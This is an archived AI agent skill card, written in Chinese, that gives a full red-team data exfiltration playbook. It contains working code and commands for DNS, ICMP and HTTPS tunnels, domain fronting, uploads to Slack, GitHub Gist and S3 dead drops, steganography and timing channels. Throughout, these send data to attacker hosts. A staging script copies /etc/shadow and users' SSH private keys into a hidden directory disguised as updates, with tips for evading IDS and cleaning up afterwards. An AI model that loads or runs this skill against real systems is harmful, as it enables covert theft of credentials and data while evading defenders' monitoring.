<!-- archived from /root/.hermes/skills/security/data-exfiltration-ops/SKILL.md on 2026-10-21 -->

---
name: data-exfiltration-ops
description: |
  数据外泄全方法论：DNS 隧道（dnscat2/iodine/dns2tcp）、HTTPS 隧道（域前置/CDN 滥用）、
  ICMP 隧道（icmpsh/ptunnel-ng）、云存储死信箱（S3/Azure/GCS 预签名 URL）、
  邮件外泄（SMTP/EWS/草稿箱）、隐写术（图片/音频/文档元数据）、
  编码加密（base64 分块/XOR/AES-256-GCM）、隐蔽信道（HTTP 头编码/IP ID/时序信道）、
  数据暂存（压缩/拆分/加密/定时传输）。
  MITRE ATT&CK T1048/T1041/T1567/T1029/T1030/T1132/T1001。
  触发词：data exfiltration、DNS tunnel、domain fronting、ICMP tunnel、
  cloud dead drop、steganography、covert channel、数据外泄。
version: "1.0"
---

> 归档卡：原目录 `/root/.hermes/skills/security/data-exfiltration-ops`。卡内 `references/…`、`scripts/…`、`templates/…` 均相对原目录；读取用 `read_file('/root/.hermes/skills/security/data-exfiltration-ops/…')`，不要相对 `references/legacy/` 解析。

# 数据外泄 — 红队方法论

> 来源：claude-red `offensive-data-exfiltration` 适配。
> 与 `oob-exfil-kit`（DNSlog/HTTP 外带探测）互补：本卡是完整的大量数据外泄。

## 快速工作流

1. **清点目标数据**：文件/数据库/凭据，评估体积和分类
2. **暂存**：复制到受控目录，去重去元数据
3. **压缩拆分**：tar/zip → 按信道拆块（DNS < 253 字节/标签；HTTPS 可 MB）
4. **加密**：AES-256-GCM 或 ChaCha20 每个块。**永不传明文**
5. **选信道**：DNS（只开 53）/ HTTPS（有 web 出口）/ ICMP（允许 ping）/ 云（有 SaaS 访问）
6. **传输**：隐蔽模式慢滴；窗口短则突发。匹配基线流量
7. **验证接收**：接收端重算 SHA-256 对比源清单
8. **清理**：安全删除暂存/临时文件/工具/计划任务

---

## DNS 外泄

### dnscat2

```bash
# 服务端——先设 NS 记录 exfil.yourdomain.com → 你的 IP
ruby dnscat2.rb exfil.yourdomain.com --secret=<REDACTED>

# 目标上的客户端
./dnscat --dns=domain:exfil.yourdomain.com --secret=<REDACTED>

# 强制 CNAME 查询避免 TXT 检测
./dnscat --dns="domain=exfil.yourdomain.com,type=CNAME" --secret=<REDACTED>
```

### iodine 隧道

```bash
# 服务端（权威 NS）
iodined -f -c -P Password 10.0.0.1 tunnel.yourdomain.com

# 客户端——创建 dns0 网卡 10.0.0.2
iodine -f -P Password tunnel.yourdomain.com
scp /tmp/staged.tar.enc attacker@10.0.0.1:/loot/
```

### TXT/CNAME 编码

```python
import base64, dns.resolver

def dns_exfil(data, domain, chunk_size=60):
    encoded = base64.b32encode(data).decode()
    for seq, i in enumerate(range(0, len(encoded), chunk_size)):
        query = f"{seq}.{encoded[i:i+chunk_size]}.data.{domain}"
        try: dns.resolver.resolve(query, "TXT")
        except: pass  # 数据在查询本身里
```

### 慢滴 DNS

```python
import random, time, base64, dns.resolver

def slow_drip(data, domain, min_delay=30, max_delay=120):
    encoded = base64.b32encode(data).decode()
    for seq, i in enumerate(range(0, len(encoded), 60)):
        query = f"{seq}.{encoded[i:i+60]}.d.{domain}"
        try: dns.resolver.resolve(query, "A")
        except: pass
        time.sleep(random.uniform(min_delay, max_delay))
```

---

## HTTPS 隧道

### 域前置（Domain Fronting via CDN）

```bash
# 外层 SNI = 合法站；内层 Host = 你的收集服务器
curl -s -H "Host: your-collection.azureedge.net" \
  --data-binary @/tmp/staged.tar.enc https://legitimate-site.azureedge.net/upload

# chisel 全隧道走 CDN
chisel server --port 443 --reverse --auth user:pass
chisel client --header "Host: your-collection.azureedge.net" \
  https://legitimate-cdn-domain.com R:socks
```

### 合法服务滥用

```bash
# Slack webhook
curl -X POST -H 'Content-type: application/json' \
  --data "{\"text\":\"$(base64 /tmp/chunk.enc)\"}" \
  https://hooks.slack.com/services/T00/B00/XXX
```

```python
# GitHub Gist（私有）
import requests, base64
def gist_exfil(data, token):
    requests.post("https://api.github.com/gists",
        json={"public": False, "files": {"d.txt": {"content": base64.b64encode(data).decode()}}},
        headers={"Authorization": f"token {token}"})
```

---

## ICMP 隧道

### icmpsh

```bash
# 攻击端
sysctl -w net.ipv4.icmp_echo_ignore_all=1
python3 icmpsh_m.py attacker_ip target_ip
```

### ptunnel-ng

```bash
ptunnel-ng -r0.0.0.0 -R22                           # 服务端
ptunnel-ng -p attacker_ip -l 2222 -r 127.0.0.1 -R 22 # 客户端
scp -P 2222 /tmp/staged.tar.enc attacker@127.0.0.1:/loot/
```

> 保持 ICMP payload < 64 字节匹配正常 ping。超过触发 IDS。

---

## 云存储死信箱

### S3 预签名 URL

```python
import boto3
def s3_upload_url(bucket, key, expiry=3600):
    return boto3.client("s3").generate_presigned_url(
        "put_object", Params={"Bucket": bucket, "Key": key}, ExpiresIn=expiry)
```

```bash
curl -X PUT -T /tmp/staged.tar.enc "https://bucket.s3.amazonaws.com/drop/d.enc?..."
```

### Azure Blob SAS / GCS Signed URL

同理——预签名 URL 不需要目标上有凭据。Drop 之间轮换桶。

---

## 隐写术

```bash
# JPEG/BMP 隐写
steghide embed -cf carrier.jpg -ef secret.enc -p "Pass" -f
steghide extract -sf carrier.jpg -p "Pass" -xf out.enc

# PNG 分析
zsteg carrier.png
```

```python
# LSB 嵌入
from PIL import Image
import struct

def lsb_embed(cover, data, output):
    img = Image.open(cover); pixels = list(img.getdata())
    payload = struct.pack(">I", len(data)) + data
    bits = []
    for byte in payload:
        for i in range(7, -1, -1): bits.append((byte >> i) & 1)
    idx = 0; new_pixels = []
    for px in pixels:
        np = list(px)
        for c in range(min(3, len(np))):
            if idx < len(bits): np[c] = (np[c] & 0xFE) | bits[idx]; idx += 1
        new_pixels.append(tuple(np))
    out = Image.new(img.mode, img.size); out.putdata(new_pixels); out.save(output)
```

---

## 隐蔽信道

### HTTP 头编码

```python
import base64, urllib.request

def http_header_exfil(data, url, chunk_size=256):
    encoded = base64.b64encode(data).decode()
    for seq, i in enumerate(range(0, len(encoded), chunk_size)):
        req = urllib.request.Request(url)
        req.add_header("X-Request-ID", f"{seq:06d}")
        req.add_header("X-Correlation-Token", encoded[i:i+chunk_size])
        try: urllib.request.urlopen(req)
        except: pass
```

### 时序信道

```python
import time, socket

def timing_exfil(data, dest_ip, dest_port, bit_time=0.1):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((dest_ip, dest_port))
    for byte in data:
        for i in range(7, -1, -1):
            bit = (byte >> i) & 1
            time.sleep(bit_time * 2 if bit else bit_time)
            sock.send(b"\x00")
    sock.close()
```

> 时序信道：bits/sec 吞吐量，几乎不可检测。只用于密钥和密码。

---

## 数据暂存

```bash
# Linux 完整管道
mkdir -p /tmp/.cache/updates
cp /etc/shadow /home/*/.ssh/id_rsa /tmp/.cache/updates/ 2>/dev/null
tar czf /tmp/.cache/updates/pkg.tar.gz -C /tmp/.cache/updates .
openssl enc -aes-256-cbc -salt -pbkdf2 -in pkg.tar.gz -out pkg.enc -pass pass:Key
split -b 65536 pkg.enc /tmp/.cache/updates/chunk_
sha256sum /tmp/.cache/updates/chunk_* > manifest.sha256
```

---

## 场景速查

| 场景 | 信道 | 工具 | 说明 |
|------|------|------|------|
| 只开 53 端口 | DNS 隧道 | iodine/dnscat2 | 慢；慢滴模式 |
| 有 web 出口 | HTTPS | chisel/curl | 最快；融入流量 |
| 域名过滤 | 域前置 | curl + CDN | CDN 需允许前置 |
| 允许 ping | ICMP | ptunnel-ng | 有限带宽；密钥/凭据 |
| 有云访问 | 死信箱 | S3/Azure/GCS URL | 目标无需工具 |
| 有邮件 | SMTP/EWS/草稿 | smtplib/exchangelib | 草稿 = 无发送证据 |
| 内容检查 | 隐写 + HTTPS | steghide + curl | 载体需看起来正常 |
| 极端监控 | 时序信道 | 自定义 Python | bits/sec；近不可检测 |
| < 1MB 单文件 | DNS TXT | 自定义脚本 | 无需投递工具 |
| > 1GB 大数据集 | HTTPS/云 | chisel/预签名 URL | 按天分块 |

---

## 与本库其他 Skill 的关系

| 需求 | 走哪张卡 |
|------|----------|
| 完整数据外泄方法论 | **本卡** |
| DNS/HTTP OOB 探测（漏洞验证用） | `oob-exfil-kit` |
| 痕迹清理 | `redteam-anti-forensics` |
| C2 基础设施 | `host-c2-verify` / `c2-zero-trust-console` |
| 网络隧道 | `intranet-penetration-testing` / `network-tunneling` |
